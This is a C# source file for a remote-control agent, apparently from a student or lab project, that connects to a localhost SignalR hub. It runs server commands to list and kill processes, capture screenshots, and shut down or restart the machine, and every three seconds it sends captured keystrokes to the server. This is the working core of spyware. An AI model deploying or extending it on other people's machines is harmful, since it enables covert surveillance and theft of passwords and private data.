// File: Services/Networking/SocketClient.cs
using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.Extensions.Logging;
using RemoteControl.Agent.Services.Media;
using RemoteControl.Agent.Services.System;
using RemoteControl.Agent.Services.Input;
using RemoteControl.Agent.Models; // Nhớ using namespace chứa ResponseDto
using System.Text.Json; // Cần thư viện này để xử lý JSON

namespace RemoteControl.Agent.Services.Networking
{
    public class SocketClient
    {
        private readonly HubConnection _hubConnection;
        private readonly ILogger<SocketClient> _logger;

        // Các Service xử lý
        private readonly ProcessHandler _processHandler;
        private readonly ScreenCapturer _screenCapturer;
        private readonly PowerHandler _powerHandler;
        private readonly Keylogger _keylogger;

        public SocketClient(
            ILogger<SocketClient> logger,
            ProcessHandler processHandler,
            ScreenCapturer screenCapturer,
            PowerHandler powerHandler,
            Keylogger keylogger)
        {
            _logger = logger;
            _processHandler = processHandler;
            _screenCapturer = screenCapturer;
            _powerHandler = powerHandler;
            _keylogger = keylogger;

            // 1. URL phải là /controlhub (theo file Program.cs backend)
            // Thay localhost bằng IP máy thật nếu chạy VMWare
            string serverUrl = "http://localhost:55512/controlhub";

            _hubConnection = new HubConnectionBuilder()
                .WithUrl(serverUrl)
                .WithAutomaticReconnect()
                .Build();

            RegisterHandlers();
        }

        private void RegisterHandlers()
        {
            // 2. Lắng nghe duy nhất sự kiện "ReceiveCommand" từ ControlHub
            _hubConnection.On<string>("ReceiveCommand", async (commandJson) =>
            {
                _logger.LogInformation($"Nhận lệnh từ Server: {commandJson}");

                try
                {
                    // Parse lệnh từ JSON (Frontend gửi xuống)
                    var cmd = JsonSerializer.Deserialize<CommandDto>(commandJson);
                    if (cmd == null) return;

                    switch (cmd.CommandType)
                    {
                        case "GET_PROCESS":
                            var processes = _processHandler.GetProcesses();
                            await SendData("PROCESS_LIST", processes);
                            break;

                        case "KILL_PROCESS":
                            if (int.TryParse(cmd.Payload, out int pid))
                            {
                                _processHandler.KillProcess(pid);
                                // Gửi thông báo lại nếu cần
                            }
                            break;

                        case "CAPTURE_SCREEN":
                            var imgBytes = _screenCapturer.TakeScreenshot();
                            // Chuyển byte[] sang Base64 string để gửi qua JSON an toàn
                            string imgBase64 = Convert.ToBase64String(imgBytes);
                            await SendData("SCREENSHOT", imgBase64);
                            break;

                        case "SHUTDOWN":
                            _powerHandler.Shutdown();
                            break;

                        case "RESTART":
                            _powerHandler.Restart();
                            break;

                        default:
                            _logger.LogWarning($"Lệnh không hỗ trợ: {cmd.CommandType}");
                            break;
                    }
                }
                catch (Exception ex)
                {
                    _logger.LogError($"Lỗi xử lý lệnh: {ex.Message}");
                }
            });
        }

        // Hàm chung để gửi dữ liệu về Backend (Gọi SendDataFromAgent trong ControlHub)
        private async Task SendData(string dataType, object data)
        {
            if (_hubConnection.State != HubConnectionState.Connected) return;

            var response = new ResponseDto
            {
                AgentId = _hubConnection.ConnectionId ?? "Unknown",
                DataType = dataType,
                Data = data
            };

            await _hubConnection.SendAsync("SendDataFromAgent", response);
        }

        public async Task ConnectAsync(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                try
                {
                    if (_hubConnection.State == HubConnectionState.Disconnected)
                    {
                        await _hubConnection.StartAsync(token);
                        _logger.LogInformation(">>> AGENT ĐÃ KẾT NỐI TỚI CONTROL HUB!");
                    }

                    // Gửi Keylog định kỳ (nếu có kết nối)
                    if (_hubConnection.State == HubConnectionState.Connected)
                    {
                        string logs = _keylogger.GetLogAndClear();
                        if (!string.IsNullOrEmpty(logs))
                        {
                            // Gửi chunk keylog về
                            await SendData("KEYLOG_CHUNK", logs);
                        }
                    }

                    await Task.Delay(3000, token);
                }
                catch (Exception ex)
                {
                    _logger.LogWarning($"Chưa kết nối được: {ex.Message}. Thử lại sau 3s...");
                    await Task.Delay(3000, token);
                }
            }
        }
    }
}